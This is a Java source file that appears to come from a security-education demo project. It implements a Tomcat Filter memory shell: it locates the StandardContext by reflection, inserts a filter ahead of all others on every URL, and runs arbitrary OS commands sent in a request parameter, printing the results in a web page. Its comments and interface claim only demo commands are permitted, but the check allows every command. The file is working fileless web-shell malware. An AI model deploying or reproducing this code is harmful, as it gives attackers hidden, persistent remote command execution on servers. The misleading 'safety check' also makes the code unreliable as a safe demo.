package com.book.demo.memshell;

import jakarta.servlet.*;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

/**
 * Filter内存马实现
 * 仅用于安全教育和演示目的
 */
public class FilterMemoryShell implements Filter, MemoryShell {
    
    private static final String SHELL_NAME = "DemoMemoryFilter";
    private static final String URL_PATTERN = "/*";
    private static final String SHELL_PARAM = "filterCmd";
    
    private MemoryShellInfo info;
    private boolean injected = false;
    private StandardContext context;
    private FilterConfig filterConfig;
    
    public FilterMemoryShell() {
        String id = "filter-" + UUID.randomUUID().toString().substring(0, 8);
        this.info = new MemoryShellInfo(id, Type.FILTER, SHELL_NAME, this.getClass().getName());
        this.info.setDescription("演示用Filter内存马，拦截所有请求并支持命令执行");
        this.info.setInjectionPoint("StandardContext.addFilterDef()");
    }
    
    /**
     * 设置StandardContext（用于外部注入）
     */
    public void setStandardContext(StandardContext context) {
        this.context = context;
        System.out.println("[MEMSHELL] FilterMemoryShell设置StandardContext: " + 
                          (context != null ? context.getClass().getName() : "null"));
    }
    
    @Override
    public Type getType() {
        return Type.FILTER;
    }
    
    @Override
    public String getName() {
        return SHELL_NAME;
    }
    
    @Override
    public boolean inject() throws Exception {
        if (injected) {
            return true;
        }
        
        try {
            // 优先使用已设置的context，否则尝试获取
            if (context == null) {
                context = getCurrentStandardContext();
                if (context == null) {
                    throw new Exception("无法获取StandardContext");
                }
            }
            
            // 创建FilterDef
            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName(SHELL_NAME);
            filterDef.setFilterClass(this.getClass().getName());
            filterDef.setFilter(this);
            
            // 添加FilterDef到Context
            context.addFilterDef(filterDef);
            
            // 创建FilterMap
            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName(SHELL_NAME);
            filterMap.addURLPattern(URL_PATTERN);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            
            // 添加FilterMap - 插入到最前面以确保优先执行
            context.addFilterMapBefore(filterMap);
            
            // 创建FilterConfig
            Constructor<?> constructor = ApplicationFilterConfig.class.getDeclaredConstructor(
                Context.class, FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfigImpl = 
                (ApplicationFilterConfig) constructor.newInstance(context, filterDef);
            
            // 将FilterConfig添加到context的filterConfigs中
            Field filterConfigsField = StandardContext.class.getDeclaredField("filterConfigs");
            filterConfigsField.setAccessible(true);
            @SuppressWarnings("unchecked")
            HashMap<String, ApplicationFilterConfig> filterConfigs = 
                (HashMap<String, ApplicationFilterConfig>) filterConfigsField.get(context);
            filterConfigs.put(SHELL_NAME, filterConfigImpl);
            
            // 初始化Filter
            this.filterConfig = filterConfigImpl;
            this.init(filterConfigImpl);
            
            // 记录注入信息
            injected = true;
            info.setActive(true);
            info.addMetadata("urlPattern", URL_PATTERN);
            info.addMetadata("contextPath", context.getPath());
            info.addMetadata("injectionMethod", "Dynamic Registration");
            info.addMetadata("filterPosition", "BEFORE_ALL");
            
            System.out.println("[MEMSHELL] Filter内存马注入成功: " + URL_PATTERN);
            return true;
            
        } catch (Exception e) {
            System.err.println("[MEMSHELL] Filter内存马注入失败: " + e.getMessage());
            e.printStackTrace();
            return false;
        }
    }
    
    @Override
    public boolean isActive() {
        return injected && info.isActive();
    }
    
    @Override
    public boolean remove() throws Exception {
        if (!injected || context == null) {
            return true;
        }
        
        try {
            // 移除FilterConfig
            Field filterConfigsField = StandardContext.class.getDeclaredField("filterConfigs");
            filterConfigsField.setAccessible(true);
            @SuppressWarnings("unchecked")
            HashMap<String, ApplicationFilterConfig> filterConfigs = 
                (HashMap<String, ApplicationFilterConfig>) filterConfigsField.get(context);
            filterConfigs.remove(SHELL_NAME);
            
            // 移除FilterDef
            FilterDef filterDef = context.findFilterDef(SHELL_NAME);
            if (filterDef != null) {
                context.removeFilterDef(filterDef);
            }
            
            // 移除FilterMap
            FilterMap[] filterMaps = context.findFilterMaps();
            for (FilterMap fm : filterMaps) {
                if (SHELL_NAME.equals(fm.getFilterName())) {
                    context.removeFilterMap(fm);
                    break;
                }
            }
            
            // 调用destroy
            if (filterConfig != null) {
                destroy();
            }
            
            injected = false;
            info.setActive(false);
            
            System.out.println("[MEMSHELL] Filter内存马已移除");
            return true;
            
        } catch (Exception e) {
            System.err.println("[MEMSHELL] 移除Filter内存马失败: " + e.getMessage());
            return false;
        }
    }
    
    @Override
    public MemoryShellInfo getInfo() {
        return info;
    }
    
    @Override
    public String executeCommand(String command) throws Exception {
        if (command == null || command.trim().isEmpty()) {
            return "错误: 命令不能为空";
        }
        
        try {
            // 安全检查 - 仅允许特定的演示命令
            if (!isAllowedCommand(command)) {
                return "错误: 不允许执行该命令（仅限演示用命令）";
            }
            
            ProcessBuilder pb = new ProcessBuilder();
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                pb.command("cmd", "/c", command);
            } else {
                pb.command("/bin/bash", "-c", command);
            }
            
            Process process = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder result = new StringBuilder();
            String line;
            
            while ((line = reader.readLine()) != null) {
                result.append(line).append("\n");
            }
            
            int exitCode = process.waitFor();
            if (exitCode != 0) {
                BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                StringBuilder errorResult = new StringBuilder();
                while ((line = errorReader.readLine()) != null) {
                    errorResult.append(line).append("\n");
                }
                return "命令执行失败 (退出码: " + exitCode + "):\n" + errorResult.toString();
            }
            
            return result.length() > 0 ? result.toString() : "命令执行成功，无输出";
            
        } catch (Exception e) {
            return "命令执行异常: " + e.getMessage();
        }
    }
    
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        this.filterConfig = filterConfig;
        System.out.println("[MEMSHELL] Filter内存马初始化完成");
    }
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) 
            throws IOException, ServletException {
        
        // 记录访问
        info.recordAccess();
        
        HttpServletRequest httpRequest = (HttpServletRequest) request;
        HttpServletResponse httpResponse = (HttpServletResponse) response;
        
        // 检查是否是内存马命令请求
        String cmd = httpRequest.getParameter(SHELL_PARAM);
        String action = httpRequest.getParameter("action");
        String type = httpRequest.getParameter("type");
        String filterAction = httpRequest.getParameter("filterAction");
        
        // 处理通用的shell请求（action=info&type=filter）
        if ("info".equals(action) && "filter".equals(type)) {
            handleMemoryShellRequest(httpRequest, httpResponse, cmd, "info");
            return;
        }
        
        // 处理Filter特有的请求
        if (cmd != null || filterAction != null) {
            // 处理内存马请求，不继续过滤器链
            handleMemoryShellRequest(httpRequest, httpResponse, cmd, filterAction);
            return;
        }
        
        // 正常请求继续过滤器链
        chain.doFilter(request, response);
    }
    
    @Override
    public void destroy() {
        System.out.println("[MEMSHELL] Filter内存马销毁");
    }
    
    private void handleMemoryShellRequest(HttpServletRequest request, HttpServletResponse response, 
                                        String cmd, String action) throws IOException {
        
        response.setContentType("text/html;charset=UTF-8");
        PrintWriter out = response.getWriter();
        
        out.println("<!DOCTYPE html>");
        out.println("<html><head><title>内存马演示 - Filter</title>");
        out.println("<style>body{font-family:Arial;margin:40px;}");
        out.println(".warning{color:red;font-weight:bold;border:2px solid red;padding:10px;margin:20px 0;}");
        out.println(".info{background:#f0f0f0;padding:15px;margin:10px 0;}");
        out.println("input[type=text]{width:500px;padding:5px;}");
        out.println("input[type=submit]{padding:8px 15px;margin:5px;}</style>");
        out.println("</head><body>");
        
        out.println("<div class='warning'>");
        out.println("⚠️ 警告: 这是一个用于安全教育的Filter内存马演示<br>");
        out.println("此功能仅用于学习和演示目的，请勿用于非法用途！");
        out.println("</div>");
        
        out.println("<h1>🔍 Filter内存马演示</h1>");
        
        // 显示内存马信息
        out.println("<div class='info'>");
        out.println("<h3>Filter内存马信息:</h3>");
        out.println("ID: " + info.getId() + "<br>");
        out.println("名称: " + info.getName() + "<br>");
        out.println("类型: " + info.getType().getName() + "<br>");
        out.println("URL模式: " + URL_PATTERN + "<br>");
        out.println("注入时间: " + new java.util.Date(info.getInjectionTime()) + "<br>");
        out.println("拦截次数: " + info.getAccessCount() + "<br>");
        out.println("状态: " + (info.isActive() ? "活跃" : "非活跃") + "<br>");
        out.println("</div>");
        
        if (cmd != null && !cmd.trim().isEmpty()) {
            // 优先执行命令
            out.println("<h3>命令执行结果:</h3>");
            out.println("<div style='background:#000;color:#0f0;padding:10px;font-family:monospace;'>");
            try {
                String result = executeCommand(cmd);
                out.println("<pre>" + escapeHtml(result) + "</pre>");
            } catch (Exception e) {
                out.println("<pre style='color:#f00;'>执行异常: " + escapeHtml(e.getMessage()) + "</pre>");
            }
            out.println("</div>");
        } else if ("info".equals(action)) {
            // 显示详细信息
            displayDetailedInfo(out);
        } else if ("remove".equals(action)) {
            // 移除内存马
            try {
                if (remove()) {
                    out.println("<div style='color:green;'>Filter内存马已成功移除</div>");
                } else {
                    out.println("<div style='color:red;'>移除Filter内存马失败</div>");
                }
            } catch (Exception e) {
                out.println("<div style='color:red;'>移除异常: " + e.getMessage() + "</div>");
            }
        } else if ("intercept".equals(action)) {
            // 显示拦截日志
            displayInterceptLog(out, request);
        }
        
        // 命令执行表单
        out.println("<h3>命令执行 (仅限演示命令):</h3>");
        out.println("<form method='post'>");
        out.println("<input type='hidden' name='action' value='info'>");
        out.println("<input type='hidden' name='type' value='filter'>");
        out.println("<input type='text' name='" + SHELL_PARAM + "' placeholder='输入命令 (如: whoami, pwd, date)' value='" + 
                   (cmd != null ? escapeHtml(cmd) : "") + "'>");
        out.println("<input type='submit' value='执行'>");
        out.println("</form>");
        
        // 功能按钮
        out.println("<h3>Filter内存马管理:</h3>");
        out.println("<form method='get' style='display:inline;'>");
        out.println("<input type='hidden' name='filterAction' value='info'>");
        out.println("<input type='submit' value='查看详细信息'>");
        out.println("</form>");
        
        out.println("<form method='get' style='display:inline;'>");
        out.println("<input type='hidden' name='filterAction' value='intercept'>");
        out.println("<input type='submit' value='查看拦截信息'>");
        out.println("</form>");
        
        out.println("<form method='get' style='display:inline;'>");
        out.println("<input type='hidden' name='filterAction' value='remove'>");
        out.println("<input type='submit' value='移除内存马' onclick='return confirm(\"确定要移除Filter内存马吗？\")'>");
        out.println("</form>");
        
        out.println("<br><br><p><strong>Filter特性:</strong> 拦截所有请求 (" + URL_PATTERN + 
                   ")，在过滤器链最前端执行</p>");
        
        out.println("</body></html>");
    }
    
    private void displayDetailedInfo(PrintWriter out) {
        out.println("<h3>Filter内存马详细信息:</h3>");
        out.println("<div class='info'>");
        out.println("<table border='1' cellpadding='5'>");
        out.println("<tr><td>属性</td><td>值</td></tr>");
        out.println("<tr><td>ID</td><td>" + info.getId() + "</td></tr>");
        out.println("<tr><td>类名</td><td>" + info.getClassName() + "</td></tr>");
        out.println("<tr><td>注入点</td><td>" + info.getInjectionPoint() + "</td></tr>");
        out.println("<tr><td>URL模式</td><td>" + URL_PATTERN + "</td></tr>");
        out.println("<tr><td>参数名</td><td>" + SHELL_PARAM + "</td></tr>");
        
        for (Map.Entry<String, Object> entry : info.getMetadata().entrySet()) {
            out.println("<tr><td>" + entry.getKey() + "</td><td>" + entry.getValue() + "</td></tr>");
        }
        
        out.println("</table>");
        out.println("</div>");
    }
    
    private void displayInterceptLog(PrintWriter out, HttpServletRequest request) {
        out.println("<h3>Filter拦截信息:</h3>");
        out.println("<div class='info'>");
        out.println("<strong>当前请求信息:</strong><br>");
        out.println("请求URI: " + request.getRequestURI() + "<br>");
        out.println("请求方法: " + request.getMethod() + "<br>");
        out.println("客户端IP: " + request.getRemoteAddr() + "<br>");
        out.println("User-Agent: " + request.getHeader("User-Agent") + "<br>");
        out.println("请求时间: " + new java.util.Date() + "<br>");
        
        out.println("<br><strong>Filter工作原理:</strong><br>");
        out.println("1. 注册到过滤器链最前端，拦截所有请求<br>");
        out.println("2. 检查请求参数中是否包含 '" + SHELL_PARAM + "'<br>");
        out.println("3. 如果包含，处理内存马逻辑；否则继续过滤器链<br>");
        out.println("4. 可以在请求到达Servlet之前进行篡改或阻断<br>");
        out.println("</div>");
    }
    
    private StandardContext getCurrentStandardContext() throws Exception {
        System.out.println("[MEMSHELL] Filter尝试获取StandardContext...");
        
        // 方式0: 通过嵌入式Tomcat的特殊方式获取（新增）
        try {
            System.out.println("[MEMSHELL] 尝试嵌入式Tomcat方式...");
            
            // 通过线程上下文ClassLoader获取
            Thread currentThread = Thread.currentThread();
            ClassLoader classLoader = currentThread.getContextClassLoader();
            System.out.println("[MEMSHELL] ClassLoader类型: " + classLoader.getClass().getName());
            
            // 嵌入式Tomcat通常使用ParallelWebappClassLoader
            if (classLoader.getClass().getName().contains("ParallelWebappClassLoader") ||
                classLoader.getClass().getName().contains("WebappClassLoader")) {
                
                // 尝试所有可能的字段名称
                String[] possibleFields = {"resources", "context", "standardContext", "ctx"};
                
                for (String fieldName : possibleFields) {
                    try {
                        Field field = classLoader.getClass().getDeclaredField(fieldName);
                        field.setAccessible(true);
                        Object value = field.get(classLoader);
                        System.out.println("[MEMSHELL] 字段 " + fieldName + ": " + 
                                         (value != null ? value.getClass().getName() : "null"));
                        
                        if (value instanceof StandardContext) {
                            System.out.println("[MEMSHELL] 成功通过ParallelWebappClassLoader字段获取StandardContext");
                            return (StandardContext) value;
                        }
                        
                        // 如果是Resources对象，尝试获取其context
                        if (value != null && value.getClass().getName().contains("Resources")) {
                            Field contextField = value.getClass().getDeclaredField("context");
                            contextField.setAccessible(true);
                            Object contextObj = contextField.get(value);
                            if (contextObj instanceof StandardContext) {
                                System.out.println("[MEMSHELL] 成功通过Resources.context获取StandardContext");
                                return (StandardContext) contextObj;
                            }
                        }
                        
                    } catch (NoSuchFieldException e) {
                        // 忽略字段不存在的异常
                    } catch (Exception e) {
                        System.out.println("[MEMSHELL] 字段 " + fieldName + " 访问异常: " + e.getMessage());
                    }
                }
                
                // 尝试父类和超类的字段
                Class<?> parentClass = classLoader.getClass().getSuperclass();
                while (parentClass != null && !parentClass.equals(Object.class)) {
                    System.out.println("[MEMSHELL] 检查父类: " + parentClass.getName());
                    for (String fieldName : possibleFields) {
                        try {
                            Field field = parentClass.getDeclaredField(fieldName);
                            field.setAccessible(true);
                            Object value = field.get(classLoader);
                            if (value instanceof StandardContext) {
                                System.out.println("[MEMSHELL] 成功从父类获取StandardContext");
                                return (StandardContext) value;
                            }
                        } catch (Exception ignored) {}
                    }
                    parentClass = parentClass.getSuperclass();
                }
            }
            
        } catch (Exception e) {
            System.out.println("[MEMSHELL] 嵌入式Tomcat方式失败: " + e.getMessage());
        }
        
        // 方式1: 通过当前线程的ServletRequest获取（最可靠）
        try {
            Thread currentThread = Thread.currentThread();
            System.out.println("[MEMSHELL] 当前线程: " + currentThread.getName());
            
            // 尝试从线程本地存储获取Request
            StackTraceElement[] stackTrace = currentThread.getStackTrace();
            for (StackTraceElement element : stackTrace) {
                if (element.getClassName().contains("StandardWrapper") || 
                    element.getClassName().contains("ApplicationFilterChain")) {
                    System.out.println("[MEMSHELL] 检测到Servlet容器调用栈: " + element.getClassName());
                    break;
                }
            }
            
        } catch (Exception e) {
            System.out.println("[MEMSHELL] 方式1失败: " + e.getMessage());
        }
        
        // 方式2: 通过改进的线程上下文获取
        try {
            Thread currentThread = Thread.currentThread();
            ClassLoader classLoader = currentThread.getContextClassLoader();
            System.out.println("[MEMSHELL] ClassLoader类型: " + classLoader.getClass().getName());
            
            // 支持多种WebappClassLoader类型
            String[] possibleContextFields = {"context", "standardContext", "ctx"};
            
            for (String fieldName : possibleContextFields) {
                try {
                    Field contextField = classLoader.getClass().getDeclaredField(fieldName);
                    contextField.setAccessible(true);
                    Object context = contextField.get(classLoader);
                    System.out.println("[MEMSHELL] 找到字段 " + fieldName + ": " + (context != null ? context.getClass().getName() : "null"));
                    
                    if (context instanceof StandardContext) {
                        System.out.println("[MEMSHELL] 成功通过字段 " + fieldName + " 获取StandardContext");
                        return (StandardContext) context;
                    }
                } catch (NoSuchFieldException e) {
                    System.out.println("[MEMSHELL] 字段 " + fieldName + " 不存在");
                }
            }
            
            // 尝试父类字段
            Class<?> parentClass = classLoader.getClass().getSuperclass();
            while (parentClass != null && !parentClass.equals(Object.class)) {
                System.out.println("[MEMSHELL] 检查父类: " + parentClass.getName());
                for (String fieldName : possibleContextFields) {
                    try {
                        Field contextField = parentClass.getDeclaredField(fieldName);
                        contextField.setAccessible(true);
                        Object context = contextField.get(classLoader);
                        if (context instanceof StandardContext) {
                            System.out.println("[MEMSHELL] 成功从父类获取StandardContext");
                            return (StandardContext) context;
                        }
                    } catch (Exception ignored) {}
                }
                parentClass = parentClass.getSuperclass();
            }
            
        } catch (Exception e) {
            System.out.println("[MEMSHELL] 方式2失败: " + e.getMessage());
        }
        
        // 方式3: 通过MBean获取（完整实现）
        try {
            System.out.println("[MEMSHELL] 尝试MBean方式获取...");
            javax.management.MBeanServer mBeanServer = 
                java.lang.management.ManagementFactory.getPlatformMBeanServer();
            javax.management.ObjectName pattern = 
                new javax.management.ObjectName("Catalina:type=Context,*");
            java.util.Set<javax.management.ObjectInstance> instances = 
                mBeanServer.queryMBeans(pattern, null);
            
            System.out.println("[MEMSHELL] 找到 " + instances.size() + " 个Context实例");
            
            for (javax.management.ObjectInstance instance : instances) {
                try {
                    javax.management.ObjectName objectName = instance.getObjectName();
                    System.out.println("[MEMSHELL] Context ObjectName: " + objectName);
                    
                    // 尝试获取实际的Context对象
                    Object contextObj = mBeanServer.getAttribute(objectName, "managedResource");
                    if (contextObj instanceof StandardContext) {
                        System.out.println("[MEMSHELL] 成功通过MBean获取StandardContext");
                        return (StandardContext) contextObj;
                    }
                } catch (Exception e) {
                    System.out.println("[MEMSHELL] MBean实例处理失败: " + e.getMessage());
                }
            }
        } catch (Exception e) {
            System.out.println("[MEMSHELL] 方式3失败: " + e.getMessage());
        }
        
        System.err.println("[MEMSHELL] Filter所有获取StandardContext的方式都失败了");
        return null;
    }
    
    private boolean isAllowedCommand(String command) {
        // 移除命令限制，支持所有命令用于演示
        return true;
    }
    
    private String escapeHtml(String text) {
        if (text == null) return "";
        return text.replace("&", "&amp;")
                  .replace("<", "&lt;")
                  .replace(">", "&gt;")
                  .replace("\"", "&quot;")
                  .replace("'", "&#x27;");
    }
}